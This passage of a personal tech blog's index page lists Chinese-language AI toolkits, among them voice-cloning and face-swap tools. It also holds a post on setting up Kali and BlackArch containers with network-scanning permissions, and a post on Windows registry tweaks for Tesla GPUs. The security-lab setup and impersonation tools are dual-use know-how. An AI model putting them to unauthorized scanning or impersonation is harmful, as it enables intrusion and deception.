class="literal">false</span>,</span><br><span class="line">CreateNoWindow = <span class="literal">false</span></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>悟空工具箱;</p>
<p><a target="_blank" rel="noopener" href="http://www.5kcrm.com/ai">www.5kcrm.com/ai</a></p>
<p><a target="_blank" rel="noopener" href="https://www.5kcrm.com/chat/id/20">Video Retalking</a> 让视频中的人物的嘴型与输入的声音同步</p>
<p><a target="_blank" rel="noopener" href="https://www.5kcrm.com/chat/id/19">OpenVoice</a> 一种多语言即时语音克隆工具</p>
<p><a target="_blank" rel="noopener" href="https://www.5kcrm.com/chat/id/13">WebGLM</a> 是一个百亿参数的通用语言模型（GLM），提供一种高效且低成本的网络增强问答系统。它通过将网络搜索和召回功能，集成到预训练的语言模型中，以进行实际应用的部署。</p>
<p><a target="_blank" rel="noopener" href="https://www.5kcrm.com/chat/id/16">DragGAN</a> 是由Max Planck研究所开发的一种新的人工智能工具，它允许用户通过几个点击和拖动来真实地修改照片。根据一篇研究文章，它提供了两个主要组成部分：基于特征的运动监督和一种革命性的点追踪技术。</p>
<p><a target="_blank" rel="noopener" href="https://www.5kcrm.com/chat/id/8">VisualGLM</a> 能够整合视觉和语言信息。可以用来理解图片，解析图片内容。</p>
<hr>
<p><a target="_blank" rel="noopener" href="https://space.bilibili.com/290745620">设计师的AI工具箱</a> UID:290745620</p>
<p>AI 3D建模 动作生成</p>
<hr>
<p>allAI 工具箱：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/OceanNg529/allAI">https://github.com/OceanNg529/allAI</a></p>
<p>包含视频抠图</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/allAI-tools/manga-image-translator">漫画翻译软件</a> 可以翻译不同的排版 保持文字方向 <a target="_blank" rel="noopener" href="https://github.com/zyddnys/manga-image-translator">原地址</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/PatchyVideo/MMDOCR-HighPerformance">MMD 视频字幕提取翻译</a></p>
<p>为了加速下载 作者把链接都放到了<a target="_blank" rel="noopener" href="https://gitee.com/ocean125/">gitee</a>上面 可以在那里找到最新的ai工具</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/moondream-allAI">moondream2</a> 一个强大且能在任何地方运行的小型视觉语言模型</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/differentialdiffusionui-allAI">differential-diffusion-ui</a> Differential Diffusion   根据文本提示修改图像，并根据指定每个区域的变化量的地图</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/supir-allAI">supir</a> 基于大规模扩散的高保真通用图像恢复模型，SupIR能够根据文本提示进行智能修复，提高图像修复的质量和智能程度。</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/triposr-allAI">TripoSR</a> 用于从单个图像快速前馈 3D 重建，由 Tripo AI 和 Stability AI   合作开发</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/dust3r-allAI">dust3r</a> 从任意图像集合中重建3D场景的框架</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/lobe-allAI">Lobe Chat</a> 一个开源的，现代设计的ChatGPT&#x2F;LLMs UI&#x2F;框架。   支持语音合成，多模态和可扩展 (函数调用)插件系统。</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/chatbotollama-allAI">Chatbot-Ollama</a> 开源聊天UI为Ollama</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/removevideobg-allAI">remove-video-bg</a> 视频背景删除工具</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/melotts-allAI">MeloTTS</a> 高质量的多语言文本到语音库   MyShell.ai。支持英语、西班牙语、法语、中文、 日语和韩语</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/gligen-allAI">gligen</a> 控件中使用ComfyUI的GLIGEN的直观GUI后端</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/facefusion-allAI">FaceFusion 2.3.0</a> 下一代换脸器和增强器</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/stablecascade-allAI">Stable Cascade</a> 来自StabilityAI的稳定级联</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/barkvoicecloning-allAI">Bark Voice Cloning</a> 上传一个干净的20秒WAV文件的声音人物，你想模仿，输入你的文本到语音提示，并点击提交！</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/briarmbg-allAI">BRIA RMBG</a> 由 BRIA.AI   开发的背景去除模型，在精心挑选的数据集上进行训练，可作为非商业用途的开源模型</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/comfyui-allAI">ComfyUI</a> 稳定扩散和稳定视频扩散 GUI</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/automatic1111-allAI">Stable Diffusion web UI</a> 一键启动 Stable Diffusion web UI版</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/allAI-tools/stablediffusionforge">Stable Diffusion Forge</a> Stable Diffusion WebUI Forge 基于 Stable Diffusion WebUI (based   on Gradio) 制作开发更容易，资源管理优化，并且加速推理。</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/instantid-allAI">InstantID</a> 最先进的无调音方法实现 仅使用单张图像生成ID-Preserving;   支持各种下游任务。</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/photomaker-allAI">PhotoMaker</a> 通过堆叠ID定制逼真的人体照片嵌入</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/vid2pose-allAI">vid2pose</a> 视频打开 DWPose</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/mooreanimateanyonemini-allAI">Moore-AnimateAnyone-Mini</a> [NVIDIA ONLY] 高效实现任何人物动画 (13G VRAM + 2G model size)</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/mooreanimateanyone-allAI">Moore-AnimateAnyone</a> [NVIDIA GPU ONLY] 非官方实施人物动画</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/faceid-allAI">IP-Adapter-FaceID</a> 输入人脸图像并将其转换为任何其他图像。适配器faceid模型的演示</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/streamdiffusion-allAI">StreamDiffusion</a> [NVIDIA ONLY] 实时交互生成的管道级解决方案</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/fooocus-allAI">Fooocus</a> 迷你版 Stable Diffusion UI</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/ocean125/rvc-allAI">RVC</a> 基于检索的语音转换</p>
<hr>
<p><a target="_blank" rel="noopener" href="https://space.bilibili.com/486989780">老麦的工具库</a> UID:486989780</p>

	
	</div>
  <a type="button" href="/blog/2024/03/31/94f55109-1d31-4bef-b2e7-c770e5ca9662/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2024-03-30 </div>
			<div class="article-title"><a href="/blog/2024/03/30/54412af5-1dc4-425c-9754-1ad0504e139d/" title="This article explains how to use Proot-Distro on Termux to install Kali and Blackarch Linux. It compares Podman with Docker for faster image pulling speed, discusses granting container permissions for network scanning commands, and suggests using Github searches for finding relevant Docker images. Additionally, it provides guidance on utilizing Kali and Blackarch Linux Docker images on Ubuntu with Docker and recommends updating installed Blackarch for better performance.">Hacker Virtual Machines, Containers</a></div>
		</h3>
	


			  
<div class="entry">

  <div class="row">
	
	
		<p>on termux you use <a target="_blank" rel="noopener" href="https://github.com/termux/proot-distro"><code>proot-distro</code></a> for installing kali and blackarch linux.</p>
<p>install via  <code>apt install proot-distro</code></p>
<hr>
<p>use podman over docker, since we do not need gpu here, and want faster pulling speed.</p>
<p>recent version of podman requires extra layer of domain&#x2F;index specification before searching and pulling images.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">podman search docker.io/kali</span><br><span class="line">podman pull docker.io/kalilinux/kali-rolling</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>if you want to run network scanning commands like <code>nmap</code>, you would grant the container sufficient permissions:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">podman run --cap-add=NET_RAW --cap-add=NET_ADMIN --<span class="built_in">rm</span> -it docker.io/parrotsec/security</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p><a target="_blank" rel="noopener" href="https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/">metasploitable2</a>, <a target="_blank" rel="noopener" href="https://parrotsec.org/docs/cloud/parrot-on-docker/">parrot linux</a> also have docker images. more cybersecurity&#x2F;ctf related images to be found.</p>
<p>run this query in search engines:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:github.com cybersecurity docker images</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/VaultSEC/osint">https://github.com/VaultSEC/osint</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/PberAcademy/Dockerimages">https://github.com/PberAcademy/Dockerimages</a></p>
<hr>
<p>on ubuntu you use docker for pulling <a target="_blank" rel="noopener" href="https://www.kali.org/docs/containers/official-kalilinux-docker-images/">kali</a> and <a target="_blank" rel="noopener" href="https://github.com/BlackArch/blackarch-docker">blackarch</a> linux images. latest images are pushed to docker hub.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull kalilinux/kali-rolling</span><br><span class="line"><span class="comment"># kali-rolling does not contain all packages</span></span><br><span class="line"><span class="comment"># run inside container: apt update &amp;&amp; apt install -y kali-linux-headless</span></span><br><span class="line">sudo docker pull blackarchlinux/blackarch</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>it is always recommend to update and upgrade the blackarch you installed.</p>

	
	</div>
  <a type="button" href="/blog/2024/03/30/54412af5-1dc4-425c-9754-1ad0504e139d/#more" class="btn btn-default more">Read More</a>
</div>

           
		
           
			  
	
	<!-- display as entry -->	
		<h3 class="title">
			<div class="date"> 2024-03-25 </div>
			<div class="article-title"><a href="/blog/2024/03/25/8907029d-6164-4ceb-99b6-69adacfd6ba8/" title="This article provides a step-by-step guide on how to enable WDDM mode on Windows for Tesla GPUs, enabling functions like DirectML and Vulkan. The process involves changing registry settings and restarting the computer. Users can verify if the changes were successful by checking the Task Manager and ensuring the correct GPU is selected when using Vulkan.">Use Tesla Gpu In Wddm Mode On Windows</a></div>
		</h3>
	


			  
<div class="entry">

  <div class="row">
	
	
		<p>On Linux there is no difference between WDDM and TCC.</p>
<p>On Windows, all Tesla GPUs operate at TCC mode, which cannot utilize functions like DirectML, Vulkan etc.</p>
<p>To enable WDDM mode, you need to <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45673245/articles/details/128555342">change the registry</a>.</p>
<p>The path: <code>Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Class\&#123;4d36e968-e325-11ce-bfc1-08002be10318&#125;</code></p>
<p>Find the Tesla card within <code>000x</code>, change <code>AdapterType</code> to 1, <code>FeatureScore</code> to 0xd1, create DWORD <code>GridLicensedFeatures</code> to 7, create DWORD <code>EnableMsHybrid</code> to 1.</p>
<p>Find the iGPU within <code>000x</code>, create DWORD <code>EnableMsHybrid</code> to 2.</p>
<p>Restart the computer. When you see the Tesla GPU popping up in Task manager you are all set.</p>
<p>Run:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi -g <span class="number">0</span> -dm <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Make sure to select the right GPU when using Vulkan.</p>

	
	</div>
  <a type="button" href="/blog/2024/03/25/8907029d-6164-4ceb-99b6-69adacfd6ba8/#more" class="btn btn-default more">Read More</a>
</div>

           
		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">
<ul class="pagination">
	 
		
		<li class="prev"><a href="/blog/page/5/" class="alignleft prev"><i class="fa fa-arrow-circle-o-left"></i> Prev</a></li>
  		

        <li><a href="/blog/"><i class="fa fa-home"></i>Home</a></li>

		
		   <li class="next"> <a href="/blog/page/7/" class="alignright next">Next<i class="fa fa-arrow-circle-o-right"></i></a> </li>
        
	
</ul>
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="fa fa-github"></i><a href="https://github.com/james4ever0/agi_computer_control/" title="Autonomous computer agent" target="_blank"]);">Project Cybergod</a></li>
	
		<li><i class="fa fa-github"></i><a href="https://github.com/james4ever0/pyjom/" title="Media content automation" target="_blank"]);">Project Pyjom</a></li>
	
		<li><i class="fa fa-github"></i><a href="https://github.com/james4ever0/prometheous/" title="Automated documentation, AI+IR(RAG)" target="_blank"]);">Project Prometheus</a></li>
	
		<li><i class="fa fa-github"></i><a href="https://github.com/james4ever0/pyjom/" title="Media Content Automation" target="_blank"]);">Project Pyjom</a></li>
	
		<li><i class="fa fa-github"></i><a href="https://github.com/james4ever0/my_blog_source/" title="Source code of my blog"" target="_blank"]);">Blog Source Code</a></li>
	
		<li><i class="fa fa-github"></i><a href="http://www.github.com/james4ever0" title="My Github account" target="_blank"]);">My Github</a></li>
	
		<li><i class="fa fa-book"></i><a href="https://samoyedsun.github.io/" title="Samoyedsun's Blog" target="_blank"]);">Samoyedsun&#39;s Blog</a></li>
	
		<li><i class="fa fa-book"></i><a href="http://atlant1c.cn/" title="Atlant1c's Blog" target="_blank"]);">Atlant1c&#39;s Blog</a></li>
	
		<li><i class="fa fa-book"></i><a href="https://www.gregoryuan.com/" title="Gregoryuan's Blog" target="_blank"]);">Gregoryuan&#39;s Blog</a></li>
	
		<li><i class="fa fa-book"></i><a href="https://yubingtao.netlify.app/" title="Yubingtao's Blog" target="_blank"]);">Yubingtao&#39;s Blog</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	

</div> <!-- row-fluid -->


    </div>
  </div>
  <div class="container-narrow">
    <footer> <p>
  &copy; 2024 James Brown
  
      with help from <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>. Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>.    
</p> </footer>
  </div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>▲</span> 
</a>

<script src="/blog/js/jquery.imagesloaded.min.js"></script>
<script src="/blog/js/gallery.js"></script>
<script src="/blog/js/bootstrap.min.js"></script>
<script src="/blog/js/main.js"></script>
<script src="/blog/js/search.js"></script> 


<link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/blog/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/blog/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>


<!-- syntax highlighting -->


</body>
</html>